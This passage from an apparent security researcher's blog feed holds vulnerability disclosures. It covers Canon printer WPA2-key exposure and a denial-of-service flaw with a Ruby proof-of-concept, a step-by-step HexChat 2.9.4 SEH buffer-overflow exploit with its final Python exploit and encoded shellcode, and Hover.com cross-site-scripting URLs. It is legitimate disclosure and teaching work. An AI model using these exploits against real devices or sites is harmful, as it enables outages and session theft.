+&lt;p&gt;I then figured I&amp;rsquo;d look at some of the more advanced settings, so I clicked the &amp;ldquo;Advanced&amp;rdquo; link. This brought me to a control panel for the printer. I saw a bunch of information, and was surprised that I had not entered &lt;b&gt;any&lt;/b&gt; credentials. I figured maybe the status page would be anonymous, but surely I&amp;rsquo;d need some password to access the management pages. But then again, I hadn&amp;rsquo;t used any password when setting up the printer using the LCD.&lt;/p&gt;
+
+&lt;h2 id=&#34;disclosure-of-wireless-key-and-ssid&#34;&gt;Disclosure of Wireless Key and SSID&lt;/h2&gt;
+
+&lt;h3 id=&#34;cve-2013-4614&#34;&gt;CVE-2013-4614&lt;/h3&gt;
+
+&lt;p&gt;I eventually browsed to the &amp;ldquo;Network Settings&amp;rdquo; tab, and saw my SSID of &amp;ldquo;Wireless&amp;rdquo;. Not too bad, since it&amp;rsquo;s broadcast in the air.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I saw that it was using WPA2, as I configured. I clicked the &amp;ldquo;Modify&amp;rdquo; button, and saw that I could change all of the wireless settings. The worst was that when I saw the &amp;ldquo;Use WPA2&amp;rdquo; radio button, I saw that there was text in the password box.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Assuming that there was a junk value in there, I viewed the source. Unfortunately, what I found was that the page did indeed have my printer&amp;rsquo;s WPA2 password right there.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_4.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I started thinking about this. It wasn&amp;rsquo;t a &lt;i&gt;huge&lt;/i&gt; issue, since you&amp;rsquo;d have to already know my WPA2 key to get to the printer, right? Oh, but what about if a device behind my firewall had been compromised by a remote attacker? The attacker would be free to navigate to my printer, and grab my password. If I was like just about every other person I talk to, I probably use the same password on everything, so I don&amp;rsquo;t have to remember unique passwords. That means now an attacker could potentially login to my email, my SSH server, or even other machines on my LAN. This scared me slightly.&lt;/p&gt;
+
+&lt;p&gt;After a while, I started thinking that perhaps there were people that could potentially put their printers directly connected to the internet, and have these management interfaces publicly exposed to anonymous clients. I checked out the &lt;a href=&#34;http://www.shodanhq.com/search?q=port%3A80+KS_HTTP+1.0&#34;&gt;ShodanHQ&lt;/a&gt; (FYI, it seems also Minolta uses this server banner as well). I saw that there were nearly 15,000 at the time of this writing, so I wrote up a quick Metasploit module to enumerate the information. It is located &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/canon_wireless.rb&#34;&gt;here&lt;/a&gt;. Below is sample output from a selection of hosts I got from ShodanHQ and a host that should time out, as a control sample.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_5.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;denial-of-service&#34;&gt;Denial of Service&lt;/h2&gt;
+
+&lt;h3 id=&#34;cve-2013-4615&#34;&gt;CVE-2013-4615&lt;/h3&gt;
+
+&lt;p&gt;I kept playing around with the configuration interface, and while tinkering with some inputs in &lt;a href=&#34;http://portswigger.net/burp/&#34;&gt;Burp&lt;/a&gt;, the device stopped responding. I walked to the other room, where we keep the printer, and noticed that it was completely unresponsive. I had to power-cycle the device, to which it came back up and told me it wasn&amp;rsquo;t powered down properly.&lt;/p&gt;
+
+&lt;p&gt;When I reported this to Canon, they asked me for more information, so I provided them the following code as a proof-of-concept.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/ruby
+
+require &#39;net/http&#39;
+require &#39;uri&#39;
+
+print &#39;Enter your printer IP Address: &#39;
+input = gets.strip
+
+printer_url = &amp;quot;http://#{input}&amp;quot;
+
+# Make the first request, to set the IP to invalid data
+post = Net::HTTP.post_form(URI.parse(printer_url + &#39;/English/pages_MacUS/cgi_lan.cgi&#39;),
+{&#39;OK.x&#39; =&amp;gt; &#39;61&#39;, &#39;OK.y&#39; =&amp;gt; &#39;12&#39;, &#39;LAN_OPT1&#39; =&amp;gt; &#39;2&#39;, &#39;LAN_TXT1&#39; =&amp;gt; &#39;Wireless&#39;, &#39;LAN_OPT3&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_TXT21&#39; =&amp;gt; &#39;192&#39;, 
+&#39;LAN_TXT22&#39; =&amp;gt; &#39;168&#39;, &#39;LAN_TXT23&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_TXT24&#39; =&amp;gt; &#39;114&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(\&#39;xss\&#39;);&amp;lt;/script&amp;gt;&#39;, &#39;LAN_TXT31&#39; =&amp;gt; &#39;255&#39;,
+&#39;LAN_TXT32&#39; =&amp;gt; &#39;255&#39;, &#39;LAN_TXT33&#39; =&amp;gt; &#39;255&#39;, &#39;LAN_TXT34&#39; =&amp;gt; &#39;0&#39;, &#39;LAN_TXT41&#39; =&amp;gt; &#39;192&#39;, &#39;LAN_TXT42&#39; =&amp;gt; &#39;168&#39;, 
+&#39;LAN_TXT43&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_TXT44&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_OPT2&#39; =&amp;gt; &#39;4&#39;, &#39;LAN_OPT4&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_HID1&#39; =&amp;gt; &#39;1&#39;})
+
+# Make the second request, to trigger the DoS
+begin
+get = Net::HTTP.get(URI.parse(printer_url + &#39;/English/pages_MacUS/lan_set_content.html&#39;))
+rescue Timeout::Error
+puts &#39;Look at your printer to see it is unresponsive.&#39;
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you look closely, you can see that I was testing for Cross-Site-Scripting, and put HTML in the &amp;ldquo;LAN_TXT24&amp;rdquo; input box. Canon&amp;rsquo;s javascript validation prevents this, but nothing stops you from manipulating the HTTP response. This is a prime example of why server-side validation is also required.&lt;/p&gt;
+
+&lt;p&gt;I ended up turning this into a Metasploit module as well. You can find it available &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/dos/http/canon_wireless_printer.rb&#34;&gt;here&lt;/a&gt;. It works pretty similarly to most DoS modules:&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_6.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;canon-s-response&#34;&gt;Canon&amp;rsquo;s Response&lt;/h2&gt;
+
+&lt;p&gt;I responsibly disclosed these vulnerabilities to Canon, but they apparently don&amp;rsquo;t deem them worthy of being fixed. I don&amp;rsquo;t think they really &amp;ldquo;get it&amp;rdquo;. Since they aren&amp;rsquo;t going to fix it, I am releasing these details publicly. Below is their reply:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Dear Mr. Andreko,&lt;/p&gt;
+
+&lt;p&gt;Thank you for your patience in allowing Canon to respond.  We have confirmed that the two issues you described in your May 27th e-mail can occur in certain printers such as the MX922.  However, with respect to the issue of no password by default, please note that the inkjet printers which have network functionality such as the MX922 are designed for home use which is supposed to be secured.  For this reason, and for user convenience, the default setting does not require a password.  However, if a user has a particular concern about third parties accessing the user’s home printer, the default setting can be changed to add a password.&lt;/p&gt;
+
+&lt;p&gt;Similarly, regarding the DoS issue, Canon believes that its printers will not have to deal with unauthorized access to the network from an external location as long as the printers are used in a secured environment.  The issue you described could only occur when unauthorized access to an unsecured network takes place from the outside.  Canon has long advised customers to ensure that their computers and printers are secured when used in a wireless LAN environment.  We will continue advising customers to use our inkjet printers in a secured network environment with a firewall.  However, even if the printer were not used in a secure environment, in the unlikely chance that this type of access occurred from outside, the printer would simply have to be unplugged and re-plugged to ensure normal operation.  In addition, if the network security settings on the printer had been changed by the external source as a result of the incident, then they would have to be changed back to the default settings along with unplugging and re-plugging the power cord to ensure normal operation.&lt;/p&gt;
+
+&lt;p&gt;Again, we thank you for giving Canon the opportunity to investigate these issues and to respond to your concerns.&lt;/p&gt;
+
+&lt;p&gt;Best regards,
+Joy
+Executive Response Representative
+Canon Customer Relations
+customer@cits.canon.com
+866-886-1901, x 2130&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I understand, these vulnerabilites aren&amp;rsquo;t super high priority. They&amp;rsquo;re no ms08-067. But I would still think a vendor would want to fix them. When searching ShodanHQ, I found a bunch of printers from UCLA. I can only imagine the chaos when it becomes finals-week, and all the printers on campus stop working randomly. That&amp;rsquo;d be bad PR for Canon. Who knows what else is out there. I&amp;rsquo;d personally be interested in dumping the firmware of the printer, and seeing if there&amp;rsquo;s a way to get remote code execution out of a crash. I&amp;rsquo;ll chalk that up to my TODO list.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Buffer Overflow in HexChat 2.9.4</title>
+      <link>https://www.mattandreko.com/blog/2013-04-06-buffer-overflow-in-hexchat-294/</link>
+      <pubDate>Sat, 06 Apr 2013 14:55:00 -0400</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2013-04-06-buffer-overflow-in-hexchat-294/</guid>
+      <description>
+
+&lt;p&gt;A buddy of mine, &lt;a href=&#34;https://twitter.com/imulitia&#34;&gt;Mulitia&lt;/a&gt;, and I were talking about 0-days, and he mentioned finding one in Hex-Chat, a popular IRC client. It was super low severity, but still neat. If you entered &amp;ldquo;/server &amp;rdquo; followed by 20,000 random characters, the application died. I decided to try to make a working exploit out of this for fun.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;I contacted HexChat, by initialling going into the #hexchat channel on irc.freenode.net and trying to find a security contact. TingPing said I could give the details specifically through him. Eventually an issue was created: &lt;a href=&#34;https://github.com/hexchat/hexchat/issues/463&#34;&gt;https://github.com/hexchat/hexchat/issues/463&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;walkthrough-of-the-exploit&#34;&gt;Walkthrough of the exploit&lt;/h2&gt;
+
+&lt;p&gt;This exploit was a little more complicated than many I&amp;rsquo;ve had to do previously. It has 3 stages, due to bad characters that can&amp;rsquo;t be entered in the payload (pretty much anything non-alpha-numeric).&lt;/p&gt;
+
+&lt;h2 id=&#34;the-offset&#34;&gt;The offset&lt;/h2&gt;
+
+&lt;p&gt;First thing&amp;rsquo;s first, when developing an exploit, you need to have the offset of the buffer so you know where to put executable statements. By using the pattern_create functionality of Mona.py, I made a 25,000 line unique string, and ran it into the program while attached to a debugger.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_pc.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I then took this long pattern, and pasted it into HexChat&amp;rsquo;s textbox, after a &amp;ldquo;/server &amp;rdquo; string:&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_pattern.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Once I hit enter, the debugger stated:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Access violation when writing to [00130000] - use Shift+F7/F8/F9 to pass the exception to the program&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Since an exception was raised, I checked the SEH window, to see if I had overwritten the SEH handler.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_seh.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Indeed, I had overwritten the SEH handler with &amp;ldquo;37635236&amp;rdquo;. I then ran mona&amp;rsquo;s pattern_offset to find the offset of the string that would overwrite the SEH handler.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_po.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Based on this knowledge, I knew the offset would be somewhere around 13340 bytes in. Since this was an SEH exploit, the next step was to find an instruction that did a pop-pop-ret.&lt;/p&gt;
+
+&lt;h2 id=&#34;pop-pop-ret&#34;&gt;Pop-Pop-Ret&lt;/h2&gt;
+
+&lt;p&gt;Finding a valid pop-pop-ret instruction became a bit difficult, because I started to find out that HexChat would pretty much only use ASCII characters. Luckily, Mona.py had me covered, and can search for filtered characters:&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_mona_seh.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I went through the seh.txt file that had all the addresses, and found one that I liked:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;0x68626463 : pop ebx # pop ebp # ret | asciiprint,ascii,lower {PAGE_EXECUTE_READ} [libglib-2.0-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.26.1.0 (C:\Program Files\HexChat\libglib-2.0-0.dll)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This string was all lowercase letters, had no ASLR or SafeSEH, so it seemed like a fairly good address to use.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-jump&#34;&gt;The jump&lt;/h2&gt;
+
+&lt;p&gt;I created a little test exploit stub so I could see the memory after the pop-pop-ret occurred. It wasn&amp;rsquo;t really anything special.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko$ perl -e &#39;print &amp;quot;A&amp;quot;x13340 . &amp;quot;\x63\x64\x62\x68&amp;quot; . &amp;quot;C&amp;quot;x11656&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I pasted it into HexChat, and saw the same Access Violation. I checked the SEH window to make sure I overwrote properly:&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_seh2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;You can see there, that the SEH is now pointing to the address of the pop-pop-ret. I created a breakpoint for 0x68626463 and hit Shift-F9. I hit the breakpoint, and F7 3 times to step through the pop-pop-ret.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_after_ppr.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Typically, in an SEH exploit, right before the PPR instruction, you&amp;rsquo;d put the next instruction that you want to execute, the nseh (more details at &lt;a href=&#34;https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/&#34;&gt;Corelan&amp;rsquo;s excellent blog&lt;/a&gt;). This instruction is typically a jump. Due to our ascii issue, I found it was possible to do a 21 byte jump, by using a conditional &amp;ldquo;JA&amp;rdquo; jump (see &lt;a href=&#34;http://www.unixwiz.net/techtips/x86-jumps.html&#34;&gt;here&lt;/a&gt; for jump details) instruction. I had to prepend 2 &amp;ldquo;DEC ESP&amp;rdquo; instructions to make the conditional jump work, by setting the proper flags. This left my exploit stub looking like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko$ perl -e &#39;print &amp;quot;A&amp;quot;x13336 . &amp;quot;\x4c\x4c\x77\x21&amp;quot; . &amp;quot;\x63\x64\x62\x68&amp;quot; . &amp;quot;C&amp;quot;x11656&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;getting-more-space&#34;&gt;Getting more space&lt;/h2&gt;
+
+&lt;p&gt;I ran the exploit stub, followed the pop-pop-ret and then the jump, and found myself in memory that I controlled. That was the good news. Unfortunately, the bad news was that I only had a very limited amount of space to put any payload (43 bytes). My first thought was to use an egghunter, however egghunters had non-ascii characters in them, and when encoded properly, were well over 43 bytes long. This left me thinking for a good while.&lt;/p&gt;
+
+&lt;p&gt;After a couple days of thinking, I thought about using a fairly non-traditional method to exploit this. In the stack, way down, was a pointer to the beginning of the buffer I sent into HexChat. I was able to use the &lt;a href=&#34;https://en.wikipedia.org/wiki/X86_instruction_listings&#34;&gt;POPAD instruction&lt;/a&gt; to get rid of several ESP values at once, since it&amp;rsquo;s Opcode was an ASCII character. By combining 38 POPAD instructions, I was able to get to the pointer in memory, and still have 5 bytes of memory to try to load it. My exploit-stub ended up looking like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko$ perl -e &#39;print &amp;quot;A&amp;quot;x13336 . &amp;quot;\x4c\x4c\x77\x21&amp;quot; . &amp;quot;\x63\x64\x62\x68&amp;quot; . &amp;quot;C&amp;quot;x29 . &amp;quot;\x61&amp;quot;x38 . &amp;quot;C&amp;quot;x11589&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When I ran it through the debugger, it worked out perfectly.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_after_popad.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;finding-the-jump-via-corruption&#34;&gt;Finding the jump via corruption&lt;/h2&gt;
+
+&lt;p&gt;With only 5 bytes remaining, and ASCII encoding requirements, I pondered a bit. I couldn&amp;rsquo;t see any way to get a &amp;ldquo;JMP ESP&amp;rdquo;. I found a JMP ESP in one of the loaded libraries, but I didn&amp;rsquo;t have enough space to push it into memory and then RETN. For some reason, during testing, I found that some of my non-ASCII characters were bad-characters, and would get translated to RETN statements. I thought perhaps I could use a &amp;ldquo;PUSH ESP&amp;rdquo; instruction which was ASCII, and then use a bad-character to convert into a &amp;ldquo;RETN&amp;rdquo; instruction, since it typically would not be ASCII (\xc3). It ended up working. I put a &amp;ldquo;\xE9&amp;rdquo;, and it converted it to &amp;ldquo;RETN&amp;rdquo; and then an &amp;ldquo;\x88&amp;rdquo;. Since I&amp;rsquo;d never be hitting the &amp;ldquo;\x88&amp;rdquo; I figured this would work. I tried it, and miraculously it did! Using a corrupted character actually let it jump!&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_push_esp.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;After taking the &amp;ldquo;RETN&amp;rdquo;, it placed me in an area with thousands of bytes for shellcode.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_after_push_esp.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;From this point, it was just as easy as inserting some alpha-numeric encoded shellcode, and changing some lengths of junk strings.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-final-working-exploit&#34;&gt;The final working exploit&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/python
+# HexChat 2.9.4 Local Exploit
+# Bug found by Jules Carter &amp;lt; @iMulitia &amp;gt;
+# Exploit by Matt &amp;quot;hostess&amp;quot; Andreko &amp;lt; mandreko [at] accuvant.com &amp;gt;
+# http://www.mattandreko.com/2013/04/buffer-overflow-in-hexchat-294.html
+junk1 = &amp;quot;B&amp;quot;*30
+shellcode = (
+# msfvenom -p windows/messagebox EXITFUNC=process BufferRegister=ESP -e x86/alpha_mixed -f c
+&amp;quot;\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49&amp;quot;
+&amp;quot;\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b&amp;quot;
+&amp;quot;\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58&amp;quot;
+&amp;quot;\x50\x38\x41\x42\x75\x4a\x49\x78\x59\x68\x6b\x6d\x4b\x4b\x69&amp;quot;
+&amp;quot;\x44\x34\x64\x64\x59\x64\x74\x71\x78\x52\x6c\x72\x33\x47\x34&amp;quot;
+&amp;quot;\x71\x78\x49\x42\x44\x4e\x6b\x50\x71\x50\x30\x4e\x6b\x64\x36&amp;quot;
+&amp;quot;\x54\x4c\x4c\x4b\x44\x36\x77\x6c\x4c\x4b\x33\x76\x77\x78\x4c&amp;quot;
+&amp;quot;\x4b\x73\x4e\x51\x30\x4e\x6b\x75\x66\x56\x58\x72\x6f\x72\x38&amp;quot;
+&amp;quot;\x51\x65\x68\x73\x43\x69\x37\x71\x38\x51\x39\x6f\x58\x61\x73&amp;quot;
+&amp;quot;\x50\x4e\x6b\x30\x6c\x36\x44\x77\x54\x6c\x4b\x42\x65\x75\x6c&amp;quot;
+&amp;quot;\x6e\x6b\x73\x64\x36\x48\x31\x68\x46\x61\x6a\x4a\x4e\x6b\x52&amp;quot;
+&amp;quot;\x6a\x66\x78\x6e\x6b\x73\x6a\x57\x50\x43\x31\x7a\x4b\x6d\x33&amp;quot;
+&amp;quot;\x34\x74\x42\x69\x6c\x4b\x47\x44\x4c\x4b\x67\x71\x48\x6e\x74&amp;quot;
+&amp;quot;\x71\x6b\x4f\x36\x51\x79\x50\x6b\x4c\x4e\x4c\x4c\x44\x39\x50&amp;quot;
+&amp;quot;\x34\x34\x75\x57\x49\x51\x4a\x6f\x36\x6d\x67\x71\x4a\x67\x5a&amp;quot;
+&amp;quot;\x4b\x5a\x54\x67\x4b\x71\x6c\x61\x34\x34\x68\x32\x55\x6d\x31&amp;quot;
+&amp;quot;\x6e\x6b\x33\x6a\x47\x54\x76\x61\x38\x6b\x71\x76\x4c\x4b\x64&amp;quot;
+&amp;quot;\x4c\x52\x6b\x4e\x6b\x71\x4a\x67\x6c\x67\x71\x4a\x4b\x4e\x6b&amp;quot;
+&amp;quot;\x74\x44\x4c\x4b\x76\x61\x69\x78\x4e\x69\x62\x64\x66\x44\x47&amp;quot;
+&amp;quot;\x6c\x63\x51\x5a\x63\x6e\x52\x33\x38\x61\x39\x69\x44\x6b\x39&amp;quot;
+&amp;quot;\x59\x75\x6c\x49\x58\x42\x73\x58\x4e\x6e\x72\x6e\x56\x6e\x58&amp;quot;
+&amp;quot;\x6c\x62\x72\x4d\x38\x4f\x6f\x6b\x4f\x69\x6f\x69\x6f\x4f\x79&amp;quot;
+&amp;quot;\x61\x55\x75\x54\x6d\x6b\x31\x6e\x4e\x38\x79\x72\x70\x73\x6f&amp;quot;
+&amp;quot;\x77\x45\x4c\x45\x74\x70\x52\x39\x78\x6c\x4e\x4b\x4f\x49\x6f&amp;quot;
+&amp;quot;\x59\x6f\x6f\x79\x43\x75\x55\x58\x73\x58\x62\x4c\x70\x6c\x51&amp;quot;
+&amp;quot;\x30\x77\x31\x53\x58\x67\x43\x54\x72\x66\x4e\x61\x74\x71\x78&amp;quot;
+&amp;quot;\x52\x55\x44\x33\x62\x45\x61\x62\x6d\x58\x51\x4c\x75\x74\x57&amp;quot;
+&amp;quot;\x7a\x4c\x49\x58\x66\x73\x66\x6b\x4f\x30\x55\x47\x74\x6b\x39&amp;quot;
+&amp;quot;\x4f\x32\x72\x70\x4d\x6b\x39\x38\x6d\x72\x72\x6d\x4f\x4c\x4b&amp;quot;
+&amp;quot;\x37\x35\x4c\x67\x54\x30\x52\x5a\x48\x75\x31\x39\x6f\x6b\x4f&amp;quot;
+&amp;quot;\x39\x6f\x33\x58\x42\x4f\x34\x38\x53\x68\x31\x30\x72\x48\x35&amp;quot;
+&amp;quot;\x31\x73\x57\x61\x75\x62\x62\x35\x38\x72\x6d\x72\x45\x54\x33&amp;quot;
+&amp;quot;\x62\x53\x54\x71\x69\x4b\x6f\x78\x33\x6c\x75\x74\x54\x4a\x6f&amp;quot;
+&amp;quot;\x79\x78\x63\x61\x78\x72\x78\x45\x70\x77\x50\x75\x70\x70\x68&amp;quot;
+&amp;quot;\x72\x6d\x50\x53\x37\x36\x77\x51\x70\x68\x43\x42\x30\x6f\x42&amp;quot;
+&amp;quot;\x4d\x71\x30\x35\x38\x52\x4f\x66\x4c\x31\x30\x61\x76\x61\x78&amp;quot;
+&amp;quot;\x71\x58\x50\x65\x42\x4c\x32\x4c\x55\x61\x5a\x69\x6e\x68\x72&amp;quot;
+&amp;quot;\x6c\x61\x34\x44\x50\x4f\x79\x4d\x31\x56\x51\x4b\x62\x33\x62&amp;quot;
+&amp;quot;\x61\x43\x46\x31\x52\x72\x39\x6f\x58\x50\x46\x51\x49\x50\x42&amp;quot;
+&amp;quot;\x70\x69\x6f\x36\x35\x34\x48\x41\x41&amp;quot;
+)
+junk2 = &amp;quot;A&amp;quot;*(13306-len(shellcode))
+stage1 = &amp;quot;\x4c\x4c\x77\x21&amp;quot; # 21 byte jump (JA)
+ret = &amp;quot;\x63\x64\x62\x68&amp;quot; # ASCII PPR
+junk3 = &amp;quot;C&amp;quot;*29
+stage2 = &amp;quot;\x61&amp;quot;*38 # POPAD x 38
+stage2 += &amp;quot;\x54&amp;quot; # PUSH ESP
+stage2 += &amp;quot;\xE9&amp;quot; # RETN # This byte is a bad char, but gets converted to RETN and \x88
+junk4 = &amp;quot;D&amp;quot;*11586
+
+print &amp;quot;Copy this text, and enter into HexChat&#39;s textbox: \&amp;quot;/server [string]\&amp;quot;&amp;quot; 
+print junk1 + shellcode + junk2 + stage1 + ret + junk3 + stage2 + junk4
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;demo-time&#34;&gt;Demo time!&lt;/h2&gt;
+
+&lt;p&gt;Here is a video demo of the exploit working with a simple messagebox payload.
+
+&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
+  &lt;iframe src=&#34;//www.youtube.com/embed/izmMjz_g-84&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
+ &lt;/div&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&#34;remediation&#34;&gt;Remediation&lt;/h2&gt;
+
+&lt;p&gt;It&amp;rsquo;s suggested that all users upgrade to 2.9.5 where this vulnerability has been fixed. HexChat is available here: &lt;a href=&#34;http://hexchat.org/downloads.html&#34;&gt;http://hexchat.org/downloads.html&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Multiple Hover.com Security Issues</title>
+      <link>https://www.mattandreko.com/blog/2013-02-28-multiple-hovercom-security-issues/</link>
+      <pubDate>Thu, 28 Feb 2013 12:05:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2013-02-28-multiple-hovercom-security-issues/</guid>
+      <description>
+
+&lt;p&gt;I&amp;rsquo;m a customer of &lt;a href=&#34;http://www.hover.com&#34;&gt;Hover&lt;/a&gt; for my domain name needs. However, that will be changing because I don&amp;rsquo;t believe that they take issues seriously.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h2 id=&#34;the-first-security-issue&#34;&gt;The first security issue&lt;/h2&gt;
+
+&lt;p&gt;I was browsing their site, looking for a new domain, and being the constant tinkerer I am, I entered a single quote into the textfield. I noticed an error, and eventually crafted this url:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.hover.com/domains/results?q=%27%3E%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E&#34;&gt;https://www.hover.com/domains/results?q=%27%3E%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;There&amp;rsquo;s nothing magical in that URL, however it demonstrated a real vulnerability in their code:&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/hover_original_xss.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;From that point, it could be trivial for an attacker to redirect traffic, and steal user sessions, thus being able to purchase domains with someone else&amp;rsquo;s money.&lt;/p&gt;
+
+&lt;p&gt;I reported this issue to them, and had an update within 3 days. They had fixed it, and that URL no longer is vulnerable.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-second-security-issue&#34;&gt;The second security issue&lt;/h2&gt;
+
+&lt;p&gt;In January, I was discussing Cross-Site Scripting attacks with a coworker, and was talking about the finding I had with &lt;a href=&#34;http://www.hover.com&#34;&gt;Hover&lt;/a&gt; and how quickly they responded. Upon further investigation, I found that they didn&amp;rsquo;t &lt;i&gt;really&lt;/i&gt; fix it, they just put a band-aid on it. I found the following URL was still vulnerable, but it was a little harder to exploit (onMouseOver):&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.hover.com/domains/results?q=hi.com%27%20style%3d%27height:10000px%27%20onmouseover%3d%27alert%28%22xss%22%29&#34;&gt;https://www.hover.com/domains/results?q=hi.com%27%20style%3d%27height:10000px%27%20onmouseover%3d%27alert%28%22xss%22%29&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
